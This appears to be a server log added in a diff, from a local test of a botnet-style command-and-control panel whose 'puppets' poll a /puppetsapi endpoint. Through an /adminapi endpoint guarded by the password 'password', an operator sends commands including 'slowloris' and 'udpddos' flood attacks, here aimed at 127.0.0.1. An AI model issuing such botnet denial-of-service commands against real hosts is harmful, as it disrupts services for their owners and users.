+2020-01-15 08:50:21,309 - 127.0.0.1 - - [15/Jan/2020 08:50:21] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:50:26,322 - 127.0.0.1 - - [15/Jan/2020 08:50:26] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:50:31,335 - 127.0.0.1 - - [15/Jan/2020 08:50:31] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:50:36,347 - 127.0.0.1 - - [15/Jan/2020 08:50:36] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:50:41,359 - 127.0.0.1 - - [15/Jan/2020 08:50:41] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:50:42,437 - 127.0.0.1 - - [15/Jan/2020 08:50:42] "[37mGET /adminapi?password=password&command=PRINT%20l HTTP/1.1[0m" 200 -
+2020-01-15 08:50:46,373 - 127.0.0.1 - - [15/Jan/2020 08:50:46] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:50:51,342 - 127.0.0.1 - - [15/Jan/2020 08:50:51] "[37mGET /adminapi?password=password&command=WAIT HTTP/1.1[0m" 200 -
+2020-01-15 08:50:51,383 - 127.0.0.1 - - [15/Jan/2020 08:50:51] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:50:56,396 - 127.0.0.1 - - [15/Jan/2020 08:50:56] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:51:04,071 - 127.0.0.1 - - [15/Jan/2020 08:51:04] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:51:09,083 - 127.0.0.1 - - [15/Jan/2020 08:51:09] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:51:14,096 - 127.0.0.1 - - [15/Jan/2020 08:51:14] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:51:19,108 - 127.0.0.1 - - [15/Jan/2020 08:51:19] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:55:26,530 -  * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
+2020-01-15 08:55:26,532 -  * Restarting with stat
+2020-01-15 08:55:26,706 -  * Debugger is active!
+2020-01-15 08:55:26,706 -  * Debugger PIN: 897-453-364
+2020-01-15 08:55:33,007 - 127.0.0.1 - - [15/Jan/2020 08:55:33] "[37mGET /adminapi?password=password&command=WAIT HTTP/1.1[0m" 200 -
+2020-01-15 08:55:38,736 - 127.0.0.1 - - [15/Jan/2020 08:55:38] "[37mGET /adminapi?password=password&command=WAIT HTTP/1.1[0m" 200 -
+2020-01-15 08:55:45,831 - 127.0.0.1 - - [15/Jan/2020 08:55:45] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:55:50,842 - 127.0.0.1 - - [15/Jan/2020 08:55:50] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:55:55,855 - 127.0.0.1 - - [15/Jan/2020 08:55:55] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:56:00,868 - 127.0.0.1 - - [15/Jan/2020 08:56:00] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:56:05,881 - 127.0.0.1 - - [15/Jan/2020 08:56:05] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:56:10,892 - 127.0.0.1 - - [15/Jan/2020 08:56:10] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:56:15,903 - 127.0.0.1 - - [15/Jan/2020 08:56:15] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:56:20,917 - 127.0.0.1 - - [15/Jan/2020 08:56:20] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:56:25,931 - 127.0.0.1 - - [15/Jan/2020 08:56:25] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:56:30,943 - 127.0.0.1 - - [15/Jan/2020 08:56:30] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:56:35,956 - 127.0.0.1 - - [15/Jan/2020 08:56:35] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:56:40,967 - 127.0.0.1 - - [15/Jan/2020 08:56:40] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:56:45,979 - 127.0.0.1 - - [15/Jan/2020 08:56:45] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:56:50,990 - 127.0.0.1 - - [15/Jan/2020 08:56:50] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:56:55,999 - 127.0.0.1 - - [15/Jan/2020 08:56:55] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:57:01,003 - 127.0.0.1 - - [15/Jan/2020 08:57:01] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:57:06,008 - 127.0.0.1 - - [15/Jan/2020 08:57:06] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:57:11,015 - 127.0.0.1 - - [15/Jan/2020 08:57:11] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:57:16,028 - 127.0.0.1 - - [15/Jan/2020 08:57:16] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:57:21,039 - 127.0.0.1 - - [15/Jan/2020 08:57:21] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:57:23,070 - 127.0.0.1 - - [15/Jan/2020 08:57:23] "[37mGET /adminapi?password=password&command=slowloris%20127.0.0.1%20-p%204444%20-s%20100 HTTP/1.1[0m" 200 -
+2020-01-15 08:57:23,078 - [!] Failed to execute command! Command was slowloris
+2020-01-15 08:57:23,078 - 127.0.0.1 - - [15/Jan/2020 08:57:23] "[37mGET /adminapi?password=password&command=slowloris HTTP/1.1[0m" 200 -
+2020-01-15 08:57:26,051 - 127.0.0.1 - - [15/Jan/2020 08:57:26] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:57:31,063 - 127.0.0.1 - - [15/Jan/2020 08:57:31] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:57:36,076 - 127.0.0.1 - - [15/Jan/2020 08:57:36] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:57:41,087 - 127.0.0.1 - - [15/Jan/2020 08:57:41] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:57:46,099 - 127.0.0.1 - - [15/Jan/2020 08:57:46] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:57:51,112 - 127.0.0.1 - - [15/Jan/2020 08:57:51] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:57:56,125 - 127.0.0.1 - - [15/Jan/2020 08:57:56] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:58:01,135 - 127.0.0.1 - - [15/Jan/2020 08:58:01] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:58:06,148 - 127.0.0.1 - - [15/Jan/2020 08:58:06] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:58:11,161 - 127.0.0.1 - - [15/Jan/2020 08:58:11] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:58:11,883 - 127.0.0.1 - - [15/Jan/2020 08:58:11] "[37mGET /adminapi?password=password&command=STOPALL HTTP/1.1[0m" 200 -
+2020-01-15 08:58:16,172 - 127.0.0.1 - - [15/Jan/2020 08:58:16] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:58:21,198 - 127.0.0.1 - - [15/Jan/2020 08:58:21] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:58:26,210 - 127.0.0.1 - - [15/Jan/2020 08:58:26] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:58:31,223 - 127.0.0.1 - - [15/Jan/2020 08:58:31] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:58:36,236 - 127.0.0.1 - - [15/Jan/2020 08:58:36] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:58:41,249 - 127.0.0.1 - - [15/Jan/2020 08:58:41] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:58:44,365 - 127.0.0.1 - - [15/Jan/2020 08:58:44] "[37mGET /adminapi?password=password&command=udpddos%20127.0.0.1%204444%20no HTTP/1.1[0m" 200 -
+2020-01-15 08:58:46,256 - 127.0.0.1 - - [15/Jan/2020 08:58:46] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:58:51,267 - 127.0.0.1 - - [15/Jan/2020 08:58:51] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:58:56,278 - 127.0.0.1 - - [15/Jan/2020 08:58:56] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:59:01,289 - 127.0.0.1 - - [15/Jan/2020 08:59:01] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
+2020-01-15 08:59:06,297 - 127.0.0.1 - - [15/Jan/2020 08:59:06] "[37mGET /puppetsapi HTTP/1.1[0m" 200 -
